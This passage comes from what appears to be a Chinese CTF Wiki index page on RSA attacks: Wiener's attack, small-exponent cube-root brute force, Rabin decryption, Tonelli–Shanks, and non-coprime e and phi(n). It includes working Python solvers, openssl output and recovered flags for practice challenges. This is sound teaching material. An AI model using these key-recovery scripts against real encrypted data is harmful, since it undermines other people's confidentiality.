885f2a38e3fb8fd1012d9b6c841cea8d9d73b232bef298afd086c1063bdd11e0777c8d2ec91ae843a67a98039cb53fad0ee25040176841a017fabf79b98de21d40bc6985f82dd84406aad26e9ac9bc5f6e12385230d9620b888c201ca9c413cbf0f36b100a6c62c5c8f065934fcf9f9f0179eea35888cb357b704441c1\n    t = gmpy2.invert(e, bt)\n    n = 0x4b4403cd5ac8bdfaa3bbf83decdc97db1fbc7615fd52f67a8acf7588945cd8c3627211ffd3964d979cb1ab3850348a453153710337c6fe3baa15d986c87fca1c97c6d270335b8a7ecae81ae0ebde48aa957e7102ce3e679423f29775eef5935006e8bc4098a52a168e07b75e431a796e3dcd29c98dab6971d3eac5b5b19fb4d2b32f8702ef97d92da547da2e22387f7555531af4327392ef9c82227c5a2479623dde06b525969e9480a39015a3ed57828162ca67e6d41fb7e79e1b25e56f1cff487c1d0e0363dc105512d75c83ad0085b75ede688611d489c1c2ea003c3b2f81722cdb307a3647f2da01fb3ba0918cc1ab88c67e1b6467775fa412de7be0b44f2e19036471b618db1415f6b656701f692c5e841d2f58da7fd2bc33e7c3c55fcb8fd980c9e459a6df44b0ef70b4b1d813a57530446aa054cbfb9d1a86ffb6074b6b7398a83b5f0543b910dcb9f111096b07a98830a3ce6da47cd36b7c1ac1b2104ea60dc198c34f1c50faa5b697f2f195afe8af5d455e8ac7ca6eda669a5a1e3bfbd290a4480376abd1ff21298d529b26a4e614ab24c776a10f5f5d8e8809467a3e81f04cf5d5b23eb4a3412886797cab4b3c5724c077354b2d11d19ae4e301cd2ca743e56456d2a785b650c7e1a727b1bd881ee85c8d109792393cc1a92a66b0bc23b164146548f4e184b10c80ec458b776df10405b65399e32d657bc83e1451\n    solve(n, t)\n</code></pre> <p>\u5176\u4e2d solve \u51fd\u6570\u5c31\u662f\u5bf9\u5e94\u7684 Wiener's Attack \u7684\u51fd\u6570\u3002</p> <p>\u6211\u4eec\u5f97\u5230\u4e86 u\uff0c\u5982\u4e0b</p> <pre><code>\u279c  rsa-wiener-attack git:(master) \u2717 python RSAwienerHacker.py\nTesting Wiener Attack\nHacked!\n('hacked_d = ', mpz(404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L))\n-------------------------\nHacked!\n('hacked_d = ', mpz(404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L))\n-------------------------\nHacked!\n('hacked_d = ', mpz(404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L))\n-------------------------\nHacked!\n('hacked_d = ', mpz(404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L))\n-------------------------\nHacked!\n('hacked_d = ', mpz(404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L))\n</code></pre> <p>\u63a5\u7740\u5229\u7528 RsaConverter \u4ee5\u53ca u\uff0ct\uff0cn \u83b7\u53d6\u5bf9\u5e94\u7684 p \u548c q\u3002\u5982\u4e0b</p> <pre><code>94121F49C0E7A37A60FDE4D13F021675ED91032EB16CB070975A3EECECE8697ED161A27D86BCBC4F45AA6CDC128EB878802E0AD3B95B2961138C8CD04D28471B558CD816279BDCCF8FA1513A444AF364D8FDA8176A4E459B1B939EBEC6BB164F06CDDE9C203C612541E79E8B6C266436AB903209F5C63C8F0DA192F129F0272090CBE1A37E2615EF7DFBB05D8D88B9C964D5A42A7E0D6D0FF344303C4364C894AB7D912065ABC30815A3B8E0232D1B3D7F6B80ED7FE4B71C3477E4D6C2C78D733CF23C694C535DB172D2968483E63CC031DFC5B27792E2235C625EC0CFDE33FD3E53915357772975D264D24A7F31308D72E1BD7656B1C16F58372E7682660381\n8220863F1CFDA6EDE52C56B4036485DB53F57A4629F5727EDC4C5637603FE059EB44751FC49EC846C0B8B50966678DFFB1CFEB350EC44B57586A81D35E4887F1722367CE99116092463079A63E3F29D4F4BC416E7728B26248EE8CD2EFEA6925EC6F455DF966CEE13C808BC15CA2A6AAC7FEA69DB7C9EB9786B50EBD437D38B73D44F3687AEB5DF03B6F425CF3171B098AAC6708D534F4D3A9B3D43BAF70316812EF95FC7EBB7E224A7016D7692B52CB0958951BAB4FB5CB1ABB4DAC606F03FA15697CC3E9DF26DE5F6D6EC45A683CD5AAFD58D416969695067795A2CF7899F61669BC7543151AB700A593BF5A1E5C2AFBCE45A08A2A9CC1685FAF1F96B138D1\n</code></pre> <p>\u7136\u540e\u6211\u4eec\u76f4\u63a5\u53bb\u83b7\u5f97 d\uff0c\u8fdb\u800c\u5c31\u53ef\u4ee5\u6062\u590d\u660e\u6587</p> <pre><code>    p = 0x94121F49C0E7A37A60FDE4D13F021675ED91032EB16CB070975A3EECECE8697ED161A27D86BCBC4F45AA6CDC128EB878802E0AD3B95B2961138C8CD04D28471B558CD816279BDCCF8FA1513A444AF364D8FDA8176A4E459B1B939EBEC6BB164F06CDDE9C203C612541E79E8B6C266436AB903209F5C63C8F0DA192F129F0272090CBE1A37E2615EF7DFBB05D8D88B9C964D5A42A7E0D6D0FF344303C4364C894AB7D912065ABC30815A3B8E0232D1B3D7F6B80ED7FE4B71C3477E4D6C2C78D733CF23C694C535DB172D2968483E63CC031DFC5B27792E2235C625EC0CFDE33FD3E53915357772975D264D24A7F31308D72E1BD7656B1C16F58372E7682660381\n    q = 0x8220863F1CFDA6EDE52C56B4036485DB53F57A4629F5727EDC4C5637603FE059EB44751FC49EC846C0B8B50966678DFFB1CFEB350EC44B57586A81D35E4887F1722367CE99116092463079A63E3F29D4F4BC416E7728B26248EE8CD2EFEA6925EC6F455DF966CEE13C808BC15CA2A6AAC7FEA69DB7C9EB9786B50EBD437D38B73D44F3687AEB5DF03B6F425CF3171B098AAC6708D534F4D3A9B3D43BAF70316812EF95FC7EBB7E224A7016D7692B52CB0958951BAB4FB5CB1ABB4DAC606F03FA15697CC3E9DF26DE5F6D6EC45A683CD5AAFD58D416969695067795A2CF7899F61669BC7543151AB700A593BF5A1E5C2AFBCE45A08A2A9CC1685FAF1F96B138D1\n    if p * q == n:\n        print 'true'\n    phin = (p - 1) * (q - 1)\n    d = gmpy2.invert(e, phin)\n    cipher = 0x2517d1866acc5b7b802a51d6251673262e9e6b2d0e0e14a87b838c2751dee91e4ea29019b0a7877b849fddf9e08580d810622db538462b529412eba9d0f8a450fe1889021c0bbd12a62ccc3fff4627b1dbdebec3a356a066adc03f7650722a34fe41ea0a247cb480a12286fffc799d66b6631a220b8401f5f50daa12943856b35e59abf8457b2269efea14f1535fb95e56398fd5f3ac153e3ea1afd7b0bb5f02832883da46343404eb44594d04bbd254a9a35749af84eaf4e35ba1c5571d41cab4d58befa79b6745d8ecf93b64dd26056a6d1e82430afbff3dbc08d6c974364b57b30c8a8230c99f0ec3168ac4813c4205d9190481282ae14f7b94400caff3786ed35863b66fefcffbef1ad1652221746a5c8da083987b2b69689cf43e86a05ce4cf059934716c455a6410560e41149fbcf5fcea3c210120f106b8f6269b9a954139350626cf4dcb497ce86264e05565ec6c6581bf28c643bb4fab8677148c8034833cedacb32172b0ff21f363ca07de0fa2882ac896954251277adc0cdd0c3bd5a3f107dbebf5f4d884e43fe9b118bdd51dc80607608670507388ae129a71e0005826c7c82efccf9c86c96777d7d3b9b5cce425e3dcf9aec0643f003c851353e36809b9202ff3b79e8f33d40967c1d36f5d585ac9eba73611152fc6d3cf36fd9a60b4c621858ed1f6d4db86054c27828e22357fa3d7c71559d175ff8e8987df\n    flag = gmpy2.powmod(cipher, d, n)\n    print long_to_bytes(flag)\n</code></pre> <p>\u5f97\u5230 flag</p> <pre><code>true\nhctf{d8e8fca2dc0f896fd7cb4cb0031ba249}\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#_10","title":"\u53c2\u8003\u6587\u732e","text":"<ul> <li>http://cacr.uwaterloo.ca/hac/about/chap8.pdf</li> </ul>"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/","title":"\u516c\u94a5\u6307\u6570\u76f8\u5173\u653b\u51fb","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#_2","title":"\u5c0f\u516c\u94a5\u6307\u6570\u653b\u51fb","text":""},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#_3","title":"\u653b\u51fb\u6761\u4ef6","text":"<p>e \u7279\u522b\u5c0f\uff0c\u6bd4\u5982 e \u4e3a 3\u3002</p>"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#_4","title":"\u653b\u51fb\u539f\u7406","text":"<p>\u5047\u8bbe\u7528\u6237\u4f7f\u7528\u7684\u5bc6\u94a5 e=3\u3002\u8003\u8651\u5230\u52a0\u5bc6\u5173\u7cfb\u6ee1\u8db3\uff1a</p>  c\\equiv m^3 \\bmod N  <p>\u5219\uff1a</p>  \\begin{align*} m^3 &amp;= c+k\\times N\\\\ m &amp;= \\sqrt[3]{c+k\\times n} \\end{align*}  <p>\u653b\u51fb\u8005\u53ef\u4ee5\u4ece\u5c0f\u5230\u5927\u679a\u4e3e k\uff0c\u4f9d\u6b21\u5f00\u4e09\u6b21\u6839\uff0c\u76f4\u5230\u5f00\u51fa\u6574\u6570\u4e3a\u6b62\u3002</p>"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#_5","title":"\u8303\u4f8b","text":"<p>\u8fd9\u91cc\u6211\u4eec\u4ee5 XMan \u4e00\u671f\u590f\u4ee4\u8425\u8bfe\u5802\u7ec3\u4e60\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff08Jarvis OJ \u6709\u590d\u73b0\uff09\uff0c\u9644\u4ef6\u4e2d\u6709\u4e00\u4e2a <code>flag.enc</code> \u548c <code>pubkey.pem</code>\uff0c\u5f88\u660e\u663e\u662f\u5bc6\u6587\u548c\u516c\u94a5\u4e86\uff0c\u5148\u7528 <code>openssl</code> \u8bfb\u4e00\u4e0b\u516c\u94a5\u3002</p> <pre><code>\u279c  Jarvis OJ-Extremely hard RSA git:(master) \u2717 openssl rsa -pubin -in pubkey.pem -text -modulus       \nPublic-Key: (4096 bit)\nModulus:\n    00:b0:be:e5:e3:e9:e5:a7:e8:d0:0b:49:33:55:c6:\n    18:fc:8c:7d:7d:03:b8:2e:40:99:51:c1:82:f3:98:\n    de:e3:10:45:80:e7:ba:70:d3:83:ae:53:11:47:56:\n    56:e8:a9:64:d3:80:cb:15:7f:48:c9:51:ad:fa:65:\n    db:0b:12:2c:a4:0e:42:fa:70:91:89:b7:19:a4:f0:\n    d7:46:e2:f6:06:9b:af:11:ce:bd:65:0f:14:b9:3c:\n    97:73:52:fd:13:b1:ee:a6:d6:e1:da:77:55:02:ab:\n    ff:89:d3:a8:b3:61:5f:d0:db:49:b8:8a:97:6b:c2:\n    05:68:48:92:84:e1:81:f6:f1:1e:27:08:91:c8:ef:\n    80:01:7b:ad:23:8e:36:30:39:a4:58:47:0f:17:49:\n    10:1b:c2:99:49:d3:a4:f4:03:8d:46:39:38:85:15:\n    79:c7:52:5a:69:98:4f:15:b5:66:7f:34:20:9b:70:\n    eb:26:11:36:94:7f:a1:23:e5:49:df:ff:00:60:18:\n    83:af:d9:36:fe:41:1e:00:6e:4e:93:d1:a0:0b:0f:\n    ea:54:1b:bf:c8:c5:18:6c:b6:22:05:03:a9:4b:24:\n    13:11:0d:64:0c:77:ea:54:ba:32:20:fc:8f:4c:c6:\n    ce:77:15:1e:29:b3:e0:65:78:c4:78:bd:1b:eb:e0:\n    45:89:ef:9a:19:7f:6f:80:6d:b8:b3:ec:d8:26:ca:\n    d2:4f:53:24:cc:de:c6:e8:fe:ad:2c:21:50:06:86:\n    02:c8:dc:dc:59:40:2c:ca:c9:42:4b:79:00:48:cc:\n    dd:93:27:06:80:95:ef:a0:10:b7:f1:96:c7:4b:a8:\n    c3:7b:12:8f:9e:14:11:75:16:33:f7:8b:7b:9e:56:\n    f7:1f:77:a1:b4:da:ad:3f:c5:4b:5e:7e:f9:35:d9:\n    a7:2f:b1:76:75:97:65:52:2b:4b:bc:02:e3:14:d5:\n    c0:6b:64:d5:05:4b:7b:09:6c:60:12:36:e6:cc:f4:\n    5b:5e:61:1c:80:5d:33:5d:ba:b0:c3:5d:22:6c:c2:\n    08:d8:ce:47:36:ba:39:a0:35:44:26:fa:e0:06:c7:\n    fe:52:d5:26:7d:cf:b9:c3:88:4f:51:fd:df:df:4a:\n    97:94:bc:fe:0e:15:57:11:37:49:e6:c8:ef:42:1d:\n    ba:26:3a:ff:68:73:9c:e0:0e:d8:0f:d0:02:2e:f9:\n    2d:34:88:f7:6d:eb:62:bd:ef:7b:ea:60:26:f2:2a:\n    1d:25:aa:2a:92:d1:24:41:4a:80:21:fe:0c:17:4b:\n    98:03:e6:bb:5f:ad:75:e1:86:a9:46:a1:72:80:77:\n    0f:12:43:f4:38:74:46:cc:ce:b2:22:2a:96:5c:c3:\n    0b:39:29\nExponent: 3 (0x3)\nModulus=B0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929\nwriting RSA key\n-----BEGIN PUBLIC KEY-----\nMIICIDANBgkqhkiG9w0BAQEFAAOCAg0AMIICCAKCAgEAsL7l4+nlp+jQC0kzVcYY\n/Ix9fQO4LkCZUcGC85je4xBFgOe6cNODrlMRR1ZW6Klk04DLFX9IyVGt+mXbCxIs\npA5C+nCRibcZpPDXRuL2BpuvEc69ZQ8UuTyXc1L9E7Huptbh2ndVAqv/idOos2Ff\n0NtJuIqXa8IFaEiShOGB9vEeJwiRyO+AAXutI442MDmkWEcPF0kQG8KZSdOk9AON\nRjk4hRV5x1JaaZhPFbVmfzQgm3DrJhE2lH+hI+VJ3/8AYBiDr9k2/kEeAG5Ok9Gg\nCw/qVBu/yMUYbLYiBQOpSyQTEQ1kDHfqVLoyIPyPTMbOdxUeKbPgZXjEeL0b6+BF\nie+aGX9vgG24s+zYJsrST1MkzN7G6P6tLCFQBoYCyNzcWUAsyslCS3kASMzdkycG\ngJXvoBC38ZbHS6jDexKPnhQRdRYz94t7nlb3H3ehtNqtP8VLXn75NdmnL7F2dZdl\nUitLvALjFNXAa2TVBUt7CWxgEjbmzPRbXmEcgF0zXbqww10ibMII2M5HNro5oDVE\nJvrgBsf+UtUmfc+5w4hPUf3f30qXlLz+DhVXETdJ5sjvQh26Jjr/aHOc4A7YD9AC\nLvktNIj3betive976mAm8iodJaoqktEkQUqAIf4MF0uYA+a7X6114YapRqFygHcP\nEkP0OHRGzM6yIiqWXMMLOSkCAQM=\n-----END PUBLIC KEY-----\n</code></pre> <p>\u770b\u5230 e=3\uff0c\u5f88\u660e\u663e\u662f\u5c0f\u516c\u94a5\u6307\u6570\u653b\u51fb\u4e86\u3002\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528 Crypto \u5e93\u6765\u8bfb\u53d6\u516c\u94a5\uff0c\u4f7f\u7528 multiprocessing \u6765\u52a0\u5feb\u7834\u89e3\u901f\u5ea6\u3002</p> <pre><code>#/usr/bin/python\n# coding=utf-8\nimport gmpy2\nfrom Crypto.PublicKey import RSA\nfrom multiprocessing import Pool\npool = Pool(4)\n\nwith open('./pubkey.pem', 'r') as f:\n    key = RSA.importKey(f)\n    N = key.n\n    e = key.e\nwith open('flag.enc', 'r') as f:\n    cipher = f.read().encode('hex')\n    cipher = int(cipher, 16)\n\n\ndef calc(j):\n    print j\n    a, b = gmpy2.iroot(cipher + j * N, 3)\n    if b == 1:\n        m = a\n        print '{:x}'.format(int(m)).decode('hex')\n        pool.terminate()\n        exit()\n\n\ndef SmallE():\n    inputs = range(0, 130000000)\n    pool.map(calc, inputs)\n    pool.close()\n    pool.join()\n\n\nif __name__ == '__main__':\n    print 'start'\n    SmallE()\n</code></pre> <p>\u7206\u7834\u65f6\u95f4\u6709\u70b9\u957f\uff0c\uff0c\u62ff\u5230 flag</p> <pre><code>Didn't you know RSA padding is really important? Now you see a non-padding message is so dangerous. And you should notice this in future.Fl4g: flag{Sm4ll_3xpon3nt_i5_W3ak}\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#_6","title":"\u9898\u76ee","text":""},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#rsa-rabin","title":"RSA \u884d\u751f\u7b97\u6cd5\u2014\u2014Rabin \u7b97\u6cd5","text":""},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#_7","title":"\u653b\u51fb\u6761\u4ef6","text":"<p>Rabin \u7b97\u6cd5\u7684\u7279\u5f81\u5728\u4e8e e=2\u3002</p>"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#_8","title":"\u653b\u51fb\u539f\u7406","text":"<p>\u5bc6\u6587\uff1a</p>  c = m^2\\bmod n  <p>\u89e3\u5bc6\uff1a</p> <ul> <li>\u8ba1\u7b97\u51fa m_p \u548c m_q\uff1a</li> </ul>  \\begin{align*} m_p &amp;= \\sqrt{c} \\bmod p\\\\ m_q &amp;= \\sqrt{c} \\bmod q \\end{align*}  <ul> <li>\u7528\u6269\u5c55\u6b27\u51e0\u91cc\u5f97\u8ba1\u7b97\u51fa y_p \u548c y_q\uff1a</li> </ul>  y_p \\cdot p + y_q \\cdot q = 1  <ul> <li>\u89e3\u51fa\u56db\u4e2a\u660e\u6587\uff1a</li> </ul>  \\begin{align*} a &amp;= (y_p \\cdot p \\cdot m_q + y_q \\cdot q \\cdot m_p) \\bmod n\\\\ b &amp;= n - a\\\\ c &amp;= (y_p \\cdot p \\cdot m_q - y_q \\cdot q \\cdot m_p) \\bmod n\\\\ d &amp;= n - c \\end{align*}  <p>\u6ce8\u610f\uff1a\u5982\u679c p \\equiv q \\equiv 3 \\pmod 4\uff0c\u5219</p>  \\begin{align*} m_p &amp;= c^{\\frac{1}{4}(p + 1)} \\bmod p\\\\ m_q &amp;= c^{\\frac{1}{4}(q + 1)} \\bmod q \\end{align*}  <p>\u800c\u4e00\u822c\u60c5\u51b5\u4e0b\uff0cp \\equiv q \\equiv 3 \\pmod 4 \u662f\u6ee1\u8db3\u7684\uff0c\u5bf9\u4e8e\u4e0d\u6ee1\u8db3\u7684\u60c5\u51b5\u4e0b\uff0c\u8bf7\u53c2\u8003\u76f8\u5e94\u7684\u7b97\u6cd5\u89e3\u51b3\u3002</p>"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#_9","title":"\u4f8b\u5b50","text":"<p>\u8fd9\u91cc\u6211\u4eec\u4ee5 XMan \u4e00\u671f\u590f\u4ee4\u8425\u8bfe\u5802\u7ec3\u4e60\uff08Jarvis OJ \u6709\u590d\u73b0\uff09\u4e3a\u4f8b\uff0c\u8bfb\u4e00\u4e0b\u516c\u94a5\u3002</p> <pre><code>\u279c  Jarvis OJ-hard RSA git:(master) \u2717 openssl rsa -pubin -in pubkey.pem -text -modulus \nPublic-Key: (256 bit)\nModulus:\n    00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:\n    1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f:\n    be:30:dd\nExponent: 2 (0x2)\nModulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD\nwriting RSA key\n-----BEGIN PUBLIC KEY-----\nMDowDQYJKoZIhvcNAQEBBQADKQAwJgIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDr\nyigb/+l/vjDdAgEC\n-----END PUBLIC KEY-----\n</code></pre> <p>e=2\uff0c\u8003\u8651 Rabin \u7b97\u6cd5\u3002\u9996\u5148\u6211\u4eec\u5148\u5206\u89e3\u4e00\u4e0b p \u548c q\uff0c\u5f97\u5230</p> <pre><code>p=275127860351348928173285174381581152299\nq=319576316814478949870590164193048041239\n</code></pre> <p>\u7f16\u5199\u4ee3\u7801</p> <pre><code>#!/usr/bin/python\n# coding=utf-8\nimport gmpy2\nimport string\nfrom Crypto.PublicKey import RSA\n\n# \u8bfb\u53d6\u516c\u94a5\u53c2\u6570\nwith open('pubkey.pem', 'r') as f:\n    key = RSA.importKey(f)\n    N = key.n\n    e = key.e\nwith open('flag.enc', 'r') as f:\n    cipher = f.read().encode('hex')\n    cipher = string.atoi(cipher, base=16)\n    # print cipher\nprint \"please input p\"\np = int(raw_input(), 10)\nprint 'please input q'\nq = int(raw_input(), 10)\n# \u8ba1\u7b97yp\u548cyq\ninv_p = gmpy2.invert(p, q)\ninv_q = gmpy2.invert(q, p)\n\n# \u8ba1\u7b97mp\u548cmq\nmp = pow(cipher, (p + 1) / 4, p)\nmq = pow(cipher, (q + 1) / 4, q)\n\n# \u8ba1\u7b97a,b,c,d\na = (inv_p * p * mq + inv_q * q * mp) % N\nb = N - int(a)\nc = (inv_p * p * mq - inv_q * q * mp) % N\nd = N - int(c)\n\nfor i in (a, b, c, d):\n    s = '%x' % i\n    if len(s) % 2 != 0:\n        s = '0' + s\n    print s.decode('hex')\n</code></pre> <p>\u62ff\u5230 flag\uff0c<code>PCTF{sp3ci4l_rsa}</code>\u3002</p>"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#tonellishanks","title":"Tonelli\u2013Shanks\u7b97\u6cd5","text":"<p><code>e=2</code>\uff0c<code>n</code>\u662f\u7d20\u6570</p> <p>TS\u7b97\u6cd5\u662f\u7528\u4e8e\u6c42\u89e3\u4e8c\u6b21\u65b9\u6839\u7684</p> <p>\u4e5f\u53ef\u4ee5\u7528<code>sympy</code>\u81ea\u5e26\u7684\u65b9\u6cd5</p> <pre><code>from sympy.ntheory.residue_ntheory import nthroot_mod\n# nthroot_mod(a,n,p) Find the solutions to x**n = a mod p\nm = nthroot_mod(c,2,r)\nprint(m)\n</code></pre> <p>\u771f\u6b63\u7684TS\u7b97\u6cd5</p> <pre><code>import gmpy2\nfrom Crypto.Util.number import *\ndef legendre(a, p):\n    return pow(a, (p - 1) // 2, p)\n\ndef tonelli(n, p):\n    assert legendre(n, p) == 1\n    q = p - 1\n    s = 0\n    while q % 2 == 0:\n        q //= 2\n        s += 1\n    if s == 1:\n        return pow(n, (p + 1) // 4, p)\n    for z in range(2, 10000):\n    #for z in range(2, p):\n        if p - 1 == legendre(z, p):\n            break\n    c = pow(z, q, p)\n    r = pow(n, (q + 1) // 2, p)\n    t = pow(n, q, p)\n    m = s\n    t2 = 0\n    while (t - 1) % p != 0:\n        t2 = (t * t) % p\n        for i in range(1, m):\n            if (t2 - 1) % p == 0:\n                break\n            t2 = (t2 * t2) % p\n        b = pow(c, 1 &lt;&lt; (m - i - 1), p)\n        r = (r * b) % p\n        c = (b * b) % p\n        t = (t * c) % p\n        m = i\n    return r\nn=7941371739956577280160664419383740967516918938781306610817149744988379280561359039016508679365806108722198157199058807892703837558280678711420411242914059658055366348123106473335186505617418956630780649894945233345985279471106888635177256011468979083320605103256178446993230320443790240285158260236926519042413378204298514714890725325831769281505530787739922007367026883959544239568886349070557272869042275528961483412544495589811933856131557221673534170105409\nd=gmpy2.mpz(7515987842794170949444517202158067021118454558360145030399453487603693522695746732547224100845570119375977629070702308991221388721952258969752305904378724402002545947182529859604584400048983091861594720299791743887521228492714135449584003054386457751933095902983841246048952155097668245322664318518861440)\ncipher=1618155233923718966393124032999431934705026408748451436388483012584983753140040289666712916510617403356206112730613485227084128314043665913357106301736817062412927135716281544348612150328867226515184078966397180771624148797528036548243343316501503364783092550480439749404301122277056732857399413805293899249313045684662146333448668209567898831091274930053147799756622844119463942087160062353526056879436998061803187343431081504474584816590199768034450005448200\n\n#python2 -m primefac -vs -m=p+1  7941371739956577280160664419383740967516918938781306610817149744988379280561359039016508679365806108722198157199058807892703837558280678711420411242914059658055366348123106473335186505617418956630780649894945233345985279471106888635177256011468979083320605103256178446993230320443790240285158260236926519042413378204298514714890725325831769281505530787739922007367026883959544239568886349070557272869042275528961483412544495589811933856131557221673534170105409\np=gmpy2.mpz(102634610559478918970860957918259981057327949366949344137104804864768237961662136189827166317524151288799657758536256924609797810164397005081733039415393)\n\nq2=gmpy2.invert(d,p**2)\nfor i in range(1000000):\n    q=gmpy2.iroot(q2+i*p**2,2)\n    if(q[1]==1):\n        print q[0],i\n        break\nq=q[0]\nr=n//p//q\n\ne=0x10001\nphi=(p-1)*(q-1)*(r-1)\nD=gmpy2.invert(e,phi)\nc=pow(cipher,D,n)\nprint c\n\nm=tonelli(c,r)\nprint m\nprint long_to_bytes(m)\n#flag{fd462593-25e4-4631-a96a-0cd5c72b2d1b}\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#e-phine-phin","title":"e, \\phi(n)\u4e0d\u4e92\u7d20\u65f6","text":""},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#sympy","title":"sympy\u5e93\u76f4\u63a5\u5f00\u6839\u53f7","text":"<p><code>sympy.nthroot_mod(c, e, n)</code></p> <p>\u9002\u7528\u4e8ee\u8f83\u5c0f\u65f6</p>"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#egcde-phinegcde-phin","title":"e/\\gcd(e, \\phi(n))","text":"<p>\u9002\u7528\u4e8ee\u8f83\u5c0f\uff0c\u4e14e/\\gcd(e, \\phi(n))\u548c\\phi(n)\u4e92\u7d20\u65f6</p> <pre><code>def invalidExponent(p,q,e,c):\n    phiN = (p - 1) * (q - 1)\n    n = p * q\n    GCD = gcd(e, phiN)\n    if (GCD == 1):\n        return \"Public exponent is valid.....\"\n    d = invert(e//GCD,phiN)\n    c = powmod(c, d, n)\n    plaintext = sympy.root(c, GCD)\n    plaintext = n2s(plaintext)\n    return plaintext\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#amm","title":"AMM \u7b97\u6cd5","text":"<p>AMM\u7b97\u6cd5\u7528\u4e8e\u5728\u6709\u9650\u57df\u5185\u5f00\u6839\uff0c\u5e38\u7528\u4e8ee, \\phi(n)\u4e0d\u4e92\u8d28\u7684\u60c5\u51b5\u3002</p> <p>e, \\phi(n)\u4e0d\u4e92\u8d28\u65f6\u6709\u89e3\uff0c\u4e14\u4e0d\u6b62\u6709\u4e00\u4e2a\u89e3\u3002</p>"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/#nctf2019-easyrsa","title":"\u4f8b\u9898 NCTF2019 easyRSA","text":"<p>\u9898\u9762\u5341\u5206\u7b80\u6d01\uff0c\u751a\u81f3\u90fd\u7ed9\u51fa\u4e86<code>p, q</code>\u3002\u4e4d\u4e00\u770b\uff0c\u80af\u5b9a\u89c9\u5f97\u8fd9\u662f\u4e00\u9053\u9001\u5206\u9898\uff0c\u7136\u800c\u4e8b\u5b9e\u8fdc\u975e\u5982\u6b64\u3002</p> <p>\u6b63\u5e38\u60c5\u51b5\u4e0b\u7684RSA\u90fd\u8981\u6c42<code>e</code>\u548c<code>phi(n)</code>\u8981\u4e92\u7d20\uff0c\u4e0d\u8fc7\u4e5f\u6709\u4e00\u4e9b<code>e</code>\u548c<code>phi(n)</code>\u6709\u5f88\u5c0f\u7684\u516c\u7ea6\u6570\u7684\u9898\u76ee\uff0c\u8fd9\u4e9b\u9898\u76ee\u57fa\u672c\u90fd\u80fd\u901a\u8fc7\u8ba1\u7b97<code>e</code>\u5bf9<code>phi(n)</code>\u7684\u9006\u5143<code>d</code>\u6765\u6c42\u89e3\u3002</p> <p>\u7136\u800c\u672c\u9898\u5219\u4e3a<code>e</code>\u548c<code>p-1</code>(\u6216<code>q-1</code>)\u7684\u6700\u5927\u516c\u7ea6\u6570\u5c31\u662f<code>e</code>\u672c\u8eab\uff0c\u4e5f\u5c31\u662f\u8bf4<code>e | p-1</code>\uff0c\u53ea\u6709\u5bf9<code>c</code>\u5f00<code>e</code>\u6b21\u65b9\u6839\u624d\u884c\u3002 \u53ef\u4ee5\u5c06\u540c\u4f59\u65b9\u7a0b</p>  m^e \\equiv c \\quad (\\text{mod}\\ n)  <p>\u5316\u6210</p>  \\begin{aligned} m^e &amp;\\equiv c \\quad (\\text{mod}\\ p)\\newline 